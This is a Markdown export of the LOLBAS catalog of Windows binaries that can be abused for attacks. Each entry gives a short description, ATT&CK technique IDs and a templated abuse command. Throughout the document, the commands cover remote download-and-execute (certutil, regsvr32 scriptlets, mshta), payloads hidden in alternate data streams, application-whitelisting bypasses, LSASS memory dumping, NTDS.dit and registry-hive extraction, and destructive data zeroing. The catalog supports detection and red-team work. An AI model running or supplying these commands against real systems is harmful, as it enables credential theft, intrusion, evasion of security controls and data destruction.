# Windows Living-off-the-Land Binaries
> Source: LOLBAS | Entries: 235 | Platform: windows


## Index

- [ADS](#ads)
- [AWL Bypass](#awl-bypass)
- [Compile](#compile)
- [Conceal](#conceal)
- [Copy](#copy)
- [Credentials](#credentials)
- [Download](#download)
- [Dump](#dump)
- [Execute](#execute)
- [Reconnaissance](#reconnaissance)
- [T1048](#t1048)
- [T1485](#t1485)
- [T1548.002](#t1548002)
- [T1562.001](#t1562001)
- [T1567](#t1567)


### ADS

#### Bitsadmin.exe
Used for managing background intelligent transfer
**Categories:** ADS, Copy, Download, Execute, T1105, T1218, T1564.004
```
bitsadmin /create 1 bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1
```

#### Certutil.exe
Windows binary used for handling certificates
**Categories:** ADS, Decode, Download, Encode, T1027.013, T1105, T1140, T1564.004
```
certutil.exe -urlcache -f {REMOTEURL:.exe} {PATH:.exe}
```

#### Cmd.exe
The command-line interpreter in Windows
**Categories:** ADS, Download, T1048.003, T1059.003, T1105, T1564.004, Upload
```
cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:{REMOTEURL:.sct} ^scrobj.dll > {PATH}:payload.bat
```

#### Control.exe
Binary used to launch controlpanel items in Windows
**Categories:** ADS, Execute, T1218.002
```
control.exe {PATH_ABSOLUTE}:evil.dll
```

#### Cscript.exe
Binary used to execute scripts in Windows
**Categories:** ADS, T1564.004
```
cscript //e:vbscript {PATH_ABSOLUTE}:script.vbs
```

#### Diantz.exe
Binary that package existing files into a cabinet (.cab) file
**Categories:** ADS, Download, Execute, T1036, T1105, T1564.004
```
diantz.exe {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:targetFile.cab
```

#### Esentutl.exe
Binary for working with Microsoft Joint Engine Technology (JET) database
**Categories:** ADS, Copy, Download, T1003.003, T1105, T1564.004
```
esentutl.exe /y {PATH_ABSOLUTE:.source.vbs} /d {PATH_ABSOLUTE:.dest.vbs} /o
```

#### Expand.exe
Binary that expands one or more compressed files
**Categories:** ADS, Copy, Download, T1105, T1564.004
```
expand {PATH_SMB:.bat} {PATH_ABSOLUTE:.bat}
```

#### Extrac32.exe
Extract to ADS, copy or overwrite a file with Extrac32.exe
**Categories:** ADS, Copy, Download, T1105, T1564.004
```
extrac32 {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE}:file.exe
```

#### Findstr.exe
Write to ADS, discover, or download files with Findstr.exe
**Categories:** ADS, Credentials, Download, T1105, T1552.001, T1564.004
```
findstr /V /L W3AllLov3LolBas {PATH_ABSOLUTE:.exe} > {PATH_ABSOLUTE}:file.exe
```

#### Forfiles.exe
Selects and executes a command on a file or set of files. This command is useful for batch processing.
**Categories:** ADS, Execute, T1202, T1564.004
```
forfiles /p c:\windows\system32 /m notepad.exe /c "{CMD}"
```

#### Makecab.exe
Binary to package existing files into a cabinet (.cab) file
**Categories:** ADS, Download, Execute, T1036, T1105, T1564.004
```
makecab {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:autoruns.cab
```

#### Mavinject.exe
Used by App-v in Windows
**Categories:** ADS, Execute, T1218.013, T1564.004
```
MavInject.exe 3110 /INJECTRUNNING {PATH_ABSOLUTE:.dll}
```

#### MpCmdRun.exe
Binary part of Windows Defender. Used to manage settings in Windows Defender
**Categories:** ADS, Download, T1105, T1564.004
```
MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}
```

#### Mshta.exe
Used by Windows to execute html applications. (.hta)
**Categories:** ADS, Download, Execute, T1105, T1218.005
```
mshta.exe {PATH:.hta}
```

#### msxsl.exe
Command line utility used to perform XSL transformations.
**Categories:** ADS, AWL Bypass, Download, Execute, T1105, T1220, T1564
```
msxsl.exe {PATH:.xml} {PATH:.xsl}
```

#### Print.exe
Used by Windows to send files to the printer
**Categories:** ADS, Copy, T1105, T1564.004
```
print /D:{PATH_ABSOLUTE}:file.exe {PATH_ABSOLUTE:.exe}
```

#### PrintBrm.exe
Printer Migration Command-Line Tool
**Categories:** ADS, Download, T1105, T1564.004
```
PrintBrm -b -d {PATH_SMB:folder} -f {PATH_ABSOLUTE:.zip}
```

#### Reg.exe
Used to manipulate the registry
**Categories:** ADS, Credentials, T1003.002, T1564.004
```
reg export HKLM\SOFTWARE\Microsoft\Evilreg {PATH_ABSOLUTE}:evilreg.reg
```

#### Regedit.exe
Used by Windows to manipulate registry
**Categories:** ADS, T1564.004
```
regedit /E {PATH_ABSOLUTE}:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey
```

#### Regini.exe
Used to manipulate the registry
**Categories:** ADS, T1564.004
```
regini.exe {PATH}:hidden.ini
```

#### Rundll32.exe
Used by Windows to execute dll files
**Categories:** ADS, Execute, T1218.011, T1564.004
```
rundll32.exe {PATH},EntryPoint
```

#### Sc.exe
Used by Windows to manage services
**Categories:** ADS, T1564.004
```
sc create evilservice binPath="\"c:\\ADS\\file.txt:cmd.exe\" /c echo works > \"c:\ADS\works.txt\"" DisplayName= "evilservice" start= auto\ & sc start evilservice
```

#### Tar.exe
Used by Windows to extract and create archives.
**Categories:** ADS, Copy, T1105, T1564.004
```
tar -cf {PATH}:ads {PATH_ABSOLUTE:folder}
```

#### Wmic.exe
The WMI command-line (WMIC) utility provides a command-line interface for WMI
**Categories:** ADS, Copy, Execute, T1105, T1218, T1564.004
```
wmic.exe process call create "{PATH_ABSOLUTE}:program.exe"
```

#### Wscript.exe
Used by Windows to execute scripts
**Categories:** ADS, T1564.004
```
wscript //e:vbscript {PATH}:script.vbs
```

### AWL Bypass

#### AccCheckConsole.exe
Verifies UI accessibility requirements
**Categories:** AWL Bypass, Execute, T1218
```
AccCheckConsole.exe -window "Untitled - Notepad" {PATH_ABSOLUTE:.dll}
```

#### Advpack.dll
Utility for installing software and drivers with rundll32.exe
**Categories:** AWL Bypass, Execute, T1218.011
```
rundll32.exe advpack.dll,LaunchINFSection {PATH:.inf},DefaultInstall_SingleUser,1,
```

#### Aspnet_Compiler.exe
ASP.NET Compilation Tool
**Categories:** AWL Bypass, T1127
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_compiler.exe -v none -p C:\users\cpl.internal\desktop\asptest\ -f C:\users\cpl.internal\desktop\asptest\none -u
```

#### Bash.exe
File used by Windows subsystem for Linux
**Categories:** AWL Bypass, Execute, T1202, T1218
```
bash.exe -c "{CMD}"
```

#### Bginfo.exe
Background Information Utility included with SysInternals Suite
**Categories:** AWL Bypass, Execute, T1218
```
bginfo.exe {PATH:.bgi} /popup /nolicprompt
```

#### Cmstp.exe
Installs or removes a Connection Manager service profile.
**Categories:** AWL Bypass, Execute, T1218.003
```
cmstp.exe /ni /s {PATH_ABSOLUTE:.inf}
```

#### coregen.exe
Binary coregen.exe (Microsoft CoreCLR Native Image Generator) loads exported function GetCLRRuntimeHost from coreclr....
**Categories:** AWL Bypass, Execute, T1055, T1218
```
coregen.exe /L {PATH_ABSOLUTE:.dll} dummy_assembly_name
```

#### Dfshim.dll
ClickOnce engine in Windows used by .NET
**Categories:** AWL Bypass, T1127.002
```
rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}
```

#### Dfsvc.exe
ClickOnce engine in Windows used by .NET
**Categories:** AWL Bypass, T1127.002
```
rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}
```

#### Dotnet.exe
dotnet.exe comes with .NET Framework
**Categories:** AWL Bypass, Execute, T1059, T1218
```
dotnet.exe {PATH:.dll}
```

#### Fsi.exe
64-bit FSharp (F#) Interpreter included with Visual Studio and DotNet Core SDK.
**Categories:** AWL Bypass, T1059
```
fsi.exe {PATH:.fsscript}
```

#### FsiAnyCpu.exe
32/64-bit FSharp (F#) Interpreter included with Visual Studio.
**Categories:** AWL Bypass, T1059
```
fsianycpu.exe {PATH:.fsscript}
```

#### Ieadvpack.dll
INF installer for Internet Explorer. Has much of the same functionality as advpack.dll.
**Categories:** AWL Bypass, Execute, T1218.011
```
rundll32.exe ieadvpack.dll,LaunchINFSection {PATH_ABSOLUTE:.inf},DefaultInstall_SingleUser,1,
```

#### Installutil.exe
The Installer tool is a command-line utility that allows you to install and uninstall server resources by executing t...
**Categories:** AWL Bypass, Download, Execute, T1105, T1218.004
```
InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll}
```

#### Microsoft.Workflow.Compiler.exe
A utility included with .NET that is capable of compiling and executing C# or VB.net code.
**Categories:** AWL Bypass, Execute, T1127
```
Microsoft.Workflow.Compiler.exe {PATH} {PATH:.log}
```

#### Msbuild.exe
Used to compile and execute code
**Categories:** AWL Bypass, Execute, T1036, T1127.001
```
msbuild.exe {PATH:.xml}
```

#### Msdeploy.exe
Microsoft tool used to deploy Web Applications.
**Categories:** AWL Bypass, Copy, Execute, T1105, T1218
```
msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand="{PATH_ABSOLUTE:.bat}"
```

#### Msdt.exe
Microsoft diagnostics tool
**Categories:** AWL Bypass, Execute, T1202, T1218
```
msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml} /skip TRUE
```

#### rcsi.exe
Non-Interactive command line inerface included with Visual Studio.
**Categories:** AWL Bypass, Execute, T1127
```
rcsi.exe {PATH:.csx}
```

#### Regasm.exe
Part of .NET
**Categories:** AWL Bypass, Execute, T1218.009
```
regasm.exe {PATH:.dll}
```

#### Regsvcs.exe
Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) ass...
**Categories:** AWL Bypass, Execute, T1218.009
```
regsvcs.exe {PATH:.dll}
```

#### Regsvr32.exe
Used by Windows to register dlls
**Categories:** AWL Bypass, Execute, T1218.010
```
regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll
```

#### Remote.exe
Debugging tool included with Windows Debugging Tools
**Categories:** AWL Bypass, Execute, T1127
```
Remote.exe /s {PATH:.exe} anythinghere
```

#### Setupapi.dll
Windows Setup Application Programming Interface
**Categories:** AWL Bypass, Execute, T1218.011
```
rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 {PATH_ABSOLUTE:.inf}
```

#### Squirrel.exe
Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.
**Categories:** AWL Bypass, Download, Execute, T1218
```
squirrel.exe --download {REMOTEURL}
```

#### Syssetup.dll
Windows NT System Setup
**Categories:** AWL Bypass, Execute, T1218.011
```
rundll32 syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 {PATH_ABSOLUTE:.inf}
```

#### Tracker.exe
Tool included with Microsoft .Net Framework.
**Categories:** AWL Bypass, Execute, T1127
```
Tracker.exe /d {PATH:.dll} /c C:\Windows\write.exe
```

#### Update.exe
Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.
**Categories:** AWL Bypass, Download, Execute, T1070, T1218, T1547
```
Update.exe --download {REMOTEURL}
```

#### VisualUiaVerifyNative.exe
A Windows SDK binary for manual and automated testing of Microsoft UI Automation implementation and controls.
**Categories:** AWL Bypass, T1218
```
VisualUiaVerifyNative.exe
```

#### vstest.console.exe
VSTest.Console.exe is the command-line tool to run tests
**Categories:** AWL Bypass, T1127
```
vstest.console.exe {PATH:.dll}
```

#### Wfc.exe
The Workflow Command-line Compiler tool is included with the Windows Software Development Kit (SDK).
**Categories:** AWL Bypass, T1127
```
wfc.exe {PATH_ABSOLUTE:.xoml}
```

#### winget.exe
Windows Package Manager tool
**Categories:** AWL Bypass, Download, Execute, T1105
```
winget.exe install --manifest {PATH:.yml}
```

#### winrm.vbs
Script used for manage Windows RM settings
**Categories:** AWL Bypass, Execute, T1216, T1220
```
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="{CMD}"} -r:http://target:5985
```

### Compile

#### Csc.exe
Binary file used by .NET Framework to compile C# code
**Categories:** Compile, T1127
```
csc.exe -out:{PATH:.exe} {PATH:.cs}
```

#### Ilasm.exe
used for compile c# code into dll or exe.
**Categories:** Compile, T1127
```
ilasm.exe {PATH_ABSOLUTE:.txt} /exe
```

#### Jsc.exe
Binary file used by .NET to compile JavaScript code to .exe or .dll format
**Categories:** Compile, T1127
```
jsc.exe {PATH:.js}
```

#### vbc.exe
Binary file used for compile vbs code
**Categories:** Compile, T1127
```
vbc.exe /target:exe {PATH_ABSOLUTE:.vb}
```

### Conceal

#### DeviceCredentialDeployment.exe
Device Credential Deployment
**Categories:** Conceal, T1564
```
DeviceCredentialDeployment
```

### Copy

#### Colorcpl.exe
Binary that handles color management
**Categories:** Copy, T1036.005
```
colorcpl {PATH}
```

#### dtutil.exe
Microsoft command line utility used to manage SQL Server Integration Services packages.
**Categories:** Copy, T1105
```
dtutil.exe /FILE {PATH_ABSOLUTE:.source.ext} /COPY FILE;{PATH_ABSOLUTE:.dest.ext}
```

#### Replace.exe
Used to replace file with another file
**Categories:** Copy, Download, T1105
```
replace.exe {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE:folder} /A
```

### Credentials

#### Cmdkey.exe
creates, lists, and deletes stored user names and passwords or credentials.
**Categories:** Credentials, T1078
```
cmdkey /list
```

#### Rpcping.exe
Used to verify rpc connection
**Categories:** Credentials, T1003, T1187
```
rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM
```

### Download

#### AppInstaller.exe
Tool used for installation of AppX/MSIX applications on Windows 10
**Categories:** Download, T1105
```
start ms-appinstaller://?source={REMOTEURL:.exe}
```

#### Bcp.exe
Microsoft SQL Server Bulk Copy Program utility for importing and exporting data between SQL Server instances and data...
**Categories:** Download, T1105
```
bcp "SELECT payload_data FROM database.dbo.payloads WHERE id=1" queryout "C:\Windows\Temp\payload.exe" -S localhost -T -c
```

#### CertOC.exe
Used for installing certificates
**Categories:** Download, Execute, T1105, T1218
```
certoc.exe -LoadDLL {PATH_ABSOLUTE:.dll}
```

#### CertReq.exe
Used for requesting and managing certificates
**Categories:** Download, T1105, Upload
```
CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE} {PATH:.txt}
```

#### cmdl32.exe
Microsoft Connection Manager Auto-Download
**Categories:** Download, T1105
```
cmdl32 /vpn /lan %cd%\config
```

#### ConfigSecurityPolicy.exe
Binary part of Windows Defender. Used to manage settings in Windows Defender. You can configure different pilot colle...
**Categories:** Download, T1105, T1567, Upload
```
ConfigSecurityPolicy.exe {PATH_ABSOLUTE} {REMOTEURL}
```

#### Desktopimgdownldr.exe
Windows binary used to configure lockscreen/desktop image
**Categories:** Download, T1105
```
set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:{REMOTEURL} /eventName:desktopimgdownldr
```

#### devtunnel.exe
Binary to enable forwarded ports on windows operating systems.
**Categories:** Download, T1105
```
devtunnel.exe host -p 8080
```

#### ECMangen.exe
Command-line tool for managing certificates in Microsoft Exchange Server.
**Categories:** Download, T1105
```
ECMangen.exe {REMOTEURL}
```

#### Excel.exe
Microsoft Office binary
**Categories:** Download, T1105
```
Excel.exe {REMOTEURL}
```

#### Finger.exe
Displays information about a user or users on a specified remote computer that is running the Finger service or daemon
**Categories:** Download, T1105
```
finger user@example.host.com | more +2 | cmd
```

#### Ftp.exe
A binary designed for connecting to FTP servers
**Categories:** Download, Execute, T1105, T1202
```
echo !{CMD} > ftpcommands.txt && ftp -s:ftpcommands.txt
```

#### GfxDownloadWrapper.exe
Remote file download used by the Intel Graphics Control Panel, receives as first parameter a URL and a destination fi...
**Categories:** Download, T1105
```
C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_[0-9]+\GfxDownloadWrapper.exe "URL" "DESTINATION FILE"
```

#### Hh.exe
Binary used for processing chm files in Windows
**Categories:** Download, Execute, T1105, T1218.001
```
HH.exe {REMOTEURL:.bat}
```

#### Ieexec.exe
The IEExec.exe application is an undocumented Microsoft .NET Framework application that is included with the .NET Fra...
**Categories:** Download, Execute, T1105, T1218
```
ieexec.exe {REMOTEURL:.exe}
```

#### IMEWDBLD.exe
Microsoft IME Open Extended Dictionary Module
**Categories:** Download, T1105
```
C:\Windows\System32\IME\SHARED\IMEWDBLD.exe {REMOTEURL}
```

#### Ldifde.exe
Creates, modifies, and deletes LDAP directory objects.
**Categories:** Download, T1105
```
Ldifde -i -f {PATH:.ldf}
```

#### Mmc.exe
Load snap-ins to locally and remotely manage Windows systems
**Categories:** Download, Execute, T1218.014, UAC Bypass
```
mmc.exe -Embedding {PATH_ABSOLUTE:.msc}
```

#### MSAccess.exe
Microsoft Office component
**Categories:** Download, T1105
```
MSAccess.exe {REMOTEURL}
```

#### Msedge.exe
Microsoft Edge browser
**Categories:** Download, Execute, T1105, T1218.015
```
msedge.exe {REMOTEURL:.exe.txt}
```

#### msedge_proxy.exe
Microsoft Edge Browser
**Categories:** Download, Execute, T1105, T1218.015
```
C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe {REMOTEURL:.zip}
```

#### MsoHtmEd.exe
Microsoft Office component
**Categories:** Download, T1105
```
MsoHtmEd.exe {REMOTEURL}
```

#### Mspub.exe
Microsoft Publisher
**Categories:** Download, T1105
```
mspub.exe {REMOTEURL}
```

#### Ngen.exe
Microsoft Native Image Generator.
**Categories:** Download, T1105
```
ngen.exe {REMOTEURL}
```

#### OneDriveStandaloneUpdater.exe
OneDrive Standalone Updater
**Categories:** Download, T1105
```
OneDriveStandaloneUpdater
```

#### PhotoViewer.dll
Windows Photo Viewer
**Categories:** Download, T1105
```
rundll32.exe "C:\Program Files\Windows Photo Viewer\PhotoViewer.dll",ImageView_Fullscreen {REMOTEURL}
```

#### Powerpnt.exe
Microsoft Office binary.
**Categories:** Download, T1105
```
Powerpnt.exe {REMOTEURL}
```

#### Presentationhost.exe
File is used for executing Browser applications
**Categories:** Download, Execute, T1105, T1218
```
Presentationhost.exe {PATH_ABSOLUTE:.xbap}
```

#### ProtocolHandler.exe
Microsoft Office binary
**Categories:** Download, T1105
```
ProtocolHandler.exe {REMOTEURL}
```

#### Scrobj.dll
Windows Script Component Runtime
**Categories:** Download, T1105
```
rundll32.exe C:\Windows\System32\scrobj.dll,GenerateTypeLib {REMOTEURL:.exe}
```

#### Shimgvw.dll
Photo Gallery Viewer
**Categories:** Download, T1105
```
rundll32.exe c:\Windows\System32\shimgvw.dll,ImageView_Fullscreen {REMOTEURL:.exe}
```

#### Visio.exe
Microsoft Visio Executable
**Categories:** Download, T1105
```
Visio.exe {REMOTEURL}
```

#### VSLaunchBrowser.exe
Microsoft Visual Studio browser launcher tool for web applications debugging
**Categories:** Download, Execute, T1105, T1127
```
VSLaunchBrowser.exe .exe {REMOTEURL:.exe}
```

#### WinProj.exe
Microsoft Project Executable
**Categories:** Download, T1105
```
WinProj.exe {REMOTEURL}
```

#### Winword.exe
Microsoft Office binary
**Categories:** Download, T1105
```
winword.exe {REMOTEURL}
```

#### Wsl.exe
Windows subsystem for Linux executable
**Categories:** Download, Execute, T1105, T1202, T1218
```
wsl.exe -e /mnt/c/Windows/System32/calc.exe
```

#### xsd.exe
XML Schema Definition Tool included with the Windows Software Development Kit (SDK).
**Categories:** Download, T1105
```
xsd.exe {REMOTEURL}
```

#### Xwizard.exe
Execute custom class that has been added to the registry or download a file with Xwizard.exe
**Categories:** Download, Execute, T1105, T1218
```
xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC}
```

### Dump

#### adplus.exe
Debugging tool included with Windows Debugging Tools
**Categories:** Dump, Execute, T1003.001, T1127
```
adplus.exe -hang -pn lsass.exe -o {PATH_ABSOLUTE:folder} -quiet
```

#### Comsvcs.dll
COM+ Services
**Categories:** Dump, T1003.001
```
rundll32 C:\windows\system32\comsvcs.dll MiniDump {LSASS_PID} dump.bin full
```

#### Createdump.exe
Microsoft .NET Runtime Crash Dump Generator (included in .NET Core)
**Categories:** Dump, T1003
```
createdump.exe -n -f {PATH:.dmp} {PID}
```

#### Diskshadow.exe
Diskshadow.exe is a tool that exposes the functionality offered by the volume shadow copy Service (VSS).
**Categories:** Dump, Execute, T1003.003, T1202
```
diskshadow.exe /s {PATH:.txt}
```

#### dsdbutil.exe
Dsdbutil is a command-line tool that is built into Windows Server. It is available if you have the AD LDS server role...
**Categories:** Dump, T1003.003
```
dsdbutil.exe "activate instance ntds" "snapshot" "create" "quit" "quit"
```

#### Dump64.exe
Memory dump tool that comes with Microsoft Visual Studio
**Categories:** Dump, T1003.001
```
dump64.exe {PID} out.dmp
```

#### DumpMinitool.exe
Dump tool part Visual Studio 2022
**Categories:** Dump, T1003.001
```
DumpMinitool.exe --file {PATH_ABSOLUTE} --processId 1132 --dumpType Full
```

#### ntdsutil.exe
Command line utility used to export Active Directory.
**Categories:** Dump, T1003.003
```
ntdsutil.exe "ac i ntds" "ifm" "create full c:\" q q
```

#### rdrleakdiag.exe
Microsoft Windows resource leak diagnostic tool
**Categories:** Dump, T1003, T1003.001
```
rdrleakdiag.exe /p 940 /o {PATH_ABSOLUTE:folder} /fullmemdmp /wait 1
```

#### Sqldumper.exe
Debugging utility included with Microsoft SQL.
**Categories:** Dump, T1003, T1003.001
```
sqldumper.exe 464 0 0x0110
```

#### Tttracer.exe
Used by Windows 1809 and newer to Debug Time Travel
**Categories:** Dump, Execute, T1003, T1127
```
tttracer.exe {PATH_ABSOLUTE:.exe}
```

#### wbadmin.exe
Windows Backup Administration utility
**Categories:** Dump, T1003.003
```
wbadmin start backup -backupTarget:{PATH_ABSOLUTE:folder} -include:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -quiet
```

### Execute

#### AddinUtil.exe
.NET Tool used for updating cache files for Microsoft Office Add-Ins.
**Categories:** Execute, T1218
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\AddinUtil.exe -AddinRoot:.
```

#### AgentExecutor.exe
Intune Management Extension included on Intune Managed Devices
**Categories:** Execute, T1218
```
AgentExecutor.exe -powershell "{PATH_ABSOLUTE:.ps1}" "{PATH_ABSOLUTE:.1.log}" "{PATH_ABSOLUTE:.2.log}" "{PATH_ABSOLUTE:.3.log}" 60000 "C:\Windows\SysWOW64\WindowsPowerShell\v1.0" 0 1
```

#### AppCert.exe
Windows App Certification Kit command-line tool.
**Categories:** Execute, T1127, T1218.007
```
appcert.exe test -apptype desktop -setuppath {PATH_ABSOLUTE:.exe} -reportoutputpath {PATH_ABSOLUTE:.xml}
```

#### AppLauncher.exe
User Experience Virtualization tool that launches applications under monitoring to capture and synchronize user setti...
**Categories:** Execute, T1127
```
AppLauncher.exe {PATH_ABSOLUTE:.exe}
```

#### Appvlp.exe
Application Virtualization Utility Included with Microsoft Office 2016
**Categories:** Execute, T1218
```
AppVLP.exe {PATH_SMB:.bat}
```

#### At.exe
Schedule periodic tasks
**Categories:** Execute, T1053.002
```
C:\Windows\System32\at.exe 09:00 /interactive /every:m,t,w,th,f,s,su {CMD}
```

#### Atbroker.exe
Helper binary for Assistive Technology (AT)
**Categories:** Execute, T1218
```
ATBroker.exe /start malware
```

#### Cdb.exe
Debugging tool included with Windows Debugging Tools.
**Categories:** Execute, T1127
```
cdb.exe -cf {PATH:.wds} -o notepad.exe
```

#### Change.exe
Remote Desktop Services MultiUser Change Utility
**Categories:** Execute, T1218
```
change.exe user
```

#### CL_Invocation.ps1
Aero diagnostics script
**Categories:** Execute, T1216
```
. C:\Windows\diagnostics\system\AERO\CL_Invocation.ps1   \nSyncInvoke {CMD}
```

#### CL_LoadAssembly.ps1
PowerShell Diagnostic Script
**Categories:** Execute, T1216
```
powershell.exe -ep bypass -command "set-location -path C:\Windows\diagnostics\system\Audio; import-module .\CL_LoadAssembly.ps1; LoadAssemblyFromPath ..\..\..\..\testing\fun.dll;[Program]::Fun()"
```

#### CL_Mutexverifiers.ps1
Proxy execution with CL_Mutexverifiers.ps1
**Categories:** Execute, T1216
```
. C:\Windows\diagnostics\system\AERO\CL_Mutexverifiers.ps1   \nrunAfterCancelProcess {PATH:.ps1}
```

#### code.exe
VSCode binary, also portable (CLI) version
**Categories:** Execute, T1219.001
```
code.exe tunnel --accept-server-license-terms --name "tunnel-name"
```

#### Conhost.exe
Console Window host
**Categories:** Execute, T1202
```
conhost.exe {CMD}
```

#### csi.exe
Command line interface included with Visual Studio.
**Categories:** Execute, T1127
```
csi.exe {PATH:.cs}
```

#### CustomShellHost.exe
A host process that is used by custom shells when using Windows in Kiosk mode.
**Categories:** Execute, T1218
```
CustomShellHost.exe
```

#### DefaultPack.EXE
This binary can be downloaded along side multiple software downloads on the Microsoft website. It gets downloaded whe...
**Categories:** Execute, T1218
```
DefaultPack.EXE /C:"{CMD}"
```

#### Desk.cpl
Desktop Settings Control Panel
**Categories:** Execute, T1218.011
```
rundll32.exe desk.cpl,InstallScreenSaver {PATH_ABSOLUTE:.scr}
```

#### Devinit.exe
Visual Studio 2019 tool
**Categories:** Execute, T1218.007
```
devinit.exe run -t msi-install -i {REMOTEURL:.msi}
```

#### Devtoolslauncher.exe
Binary will execute specified binary. Part of VS/VScode installation.
**Categories:** Execute, T1127
```
devtoolslauncher.exe LaunchForDeploy {PATH_ABSOLUTE:.exe} "{CMD:args}" test
```

#### Dnscmd.exe
A command-line interface for managing DNS servers
**Categories:** Execute, T1543.003
```
dnscmd.exe dc1.lab.int /config /serverlevelplugindll {PATH_SMB:.dll}
```

#### dnx.exe
.NET Execution environment file included with .NET.
**Categories:** Execute, T1127
```
dnx.exe {PATH_ABSOLUTE:folder}
```

#### Dxcap.exe
DirectX diagnostics/debugger included with Visual Studio.
**Categories:** Execute, T1127
```
Dxcap.exe -c {PATH_ABSOLUTE:.exe}
```

#### Explorer.exe
Binary used for managing files and system components within Windows
**Categories:** Execute, T1202
```
explorer.exe /root,"{PATH_ABSOLUTE:.exe}"
```

#### Extexport.exe
Load a DLL located in the c:\test folder with a specific name.
**Categories:** Execute, T1218
```
Extexport.exe {PATH_ABSOLUTE:folder} foo bar
```

#### Fsutil.exe
File System Utility
**Categories:** Execute, T1218, T1485, Tamper
```
fsutil.exe file setZeroData offset=0 length=9999999999 {PATH_ABSOLUTE}
```

#### Gpscript.exe
Used by group policy to process scripts
**Categories:** Execute, T1218
```
Gpscript /logon
```

#### Ie4uinit.exe
Executes commands from a specially prepared ie4uinit.inf file.
**Categories:** Execute, T1218
```
ie4uinit.exe -BaseSettings
```

#### iediagcmd.exe
Diagnostics Utility for Internet Explorer
**Categories:** Execute, T1218
```
set windir=c:\test& cd "C:\Program Files\Internet Explorer\" & iediagcmd.exe /out:{PATH_ABSOLUTE:.cab}
```

#### Ieframe.dll
Internet Browser DLL for translating HTML code.
**Categories:** Execute, T1218.011
```
rundll32.exe ieframe.dll,OpenURL {PATH_ABSOLUTE:.url}
```

#### Infdefaultinstall.exe
Binary used to perform installation based on content inside inf files
**Categories:** Execute, T1218
```
InfDefaultInstall.exe {PATH:.inf}
```

#### IntelliTrace.exe
Visual Studio command-line tool for collecting and managing diagnostic trace files.
**Categories:** Execute, T1127
```
IntelliTrace.exe launch /cp:"collectionplan.xml" /f:"c:\users\public\log" "C:\Windows\System32\calc.exe"
```

#### Launch-VsDevShell.ps1
Locates and imports a Developer PowerShell module and calls the Enter-VsDevShell cmdlet
**Categories:** Execute, T1216
```
powershell -ep RemoteSigned -f .\Launch-VsDevShell.ps1 -VsWherePath {PATH_ABSOLUTE:.exe}
```

#### Logger.exe
A logging configuration tool from the Windows Kits used to start and manage process logging.
**Categories:** Execute, T1202
```
logger.exe RUN "{CMD}"
```

#### Manage-bde.wsf
Script for managing BitLocker
**Categories:** Execute, T1216
```
set comspec={PATH_ABSOLUTE:.exe} & cscript c:\windows\system32\manage-bde.wsf
```

#### Mftrace.exe
Trace log generation tool for Media Foundation Tools.
**Categories:** Execute, T1127
```
Mftrace.exe {PATH:.exe}
```

#### Microsoft.NodejsTools.PressAnyKey.exe
Part of the NodeJS Visual Studio tools.
**Categories:** Execute, T1127
```
Microsoft.NodejsTools.PressAnyKey.exe normal 1 {PATH:.exe}
```

#### Mpiexec.exe
Command-line tool for running Message Passing Interface (MPI) applications.
**Categories:** Execute, T1127
```
mpiexec.exe {CMD}
```

#### Msconfig.exe
MSConfig is a troubleshooting tool which is used to temporarily disable or re-enable software, device drivers or Wind...
**Categories:** Execute, T1218
```
Msconfig.exe -5
```

#### msedgewebview2.exe
msedgewebview2.exe is the executable file for Microsoft Edge WebView2, which is a web browser control used by applica...
**Categories:** Execute, T1218.015
```
msedgewebview2.exe --no-sandbox --browser-subprocess-path="{PATH_ABSOLUTE:.exe}"
```

#### Mshtml.dll
Microsoft HTML Viewer
**Categories:** Execute, T1218.011
```
rundll32.exe Mshtml.dll,PrintHTML {PATH_ABSOLUTE:.hta}
```

#### Msiexec.exe
Used by Windows to execute msi files
**Categories:** Execute, T1218.007
```
msiexec /quiet /i {PATH:.msi}
```

#### Netsh.exe
Netsh is a Windows tool used to manipulate network interface settings.
**Categories:** Execute, T1546.007
```
netsh.exe add helper {PATH_ABSOLUTE:.dll}
```

#### Ntsd.exe
Symbolic Debugger for Windows.
**Categories:** Execute, T1127
```
ntsd.exe -g {CMD}
```

#### Odbcconf.exe
Used in Windows for managing ODBC connections
**Categories:** Execute, T1218.008
```
odbcconf /a {REGSVR {PATH_ABSOLUTE:.dll}}
```

#### OfflineScannerShell.exe
Windows Defender Offline Shell
**Categories:** Execute, T1218
```
OfflineScannerShell
```

#### OpenConsole.exe
Console Window host for Windows Terminal
**Categories:** Execute, T1202
```
OpenConsole.exe {PATH:.exe}
```

#### Pcalua.exe
Program Compatibility Assistant
**Categories:** Execute, T1202
```
pcalua.exe -a {PATH:.exe}
```

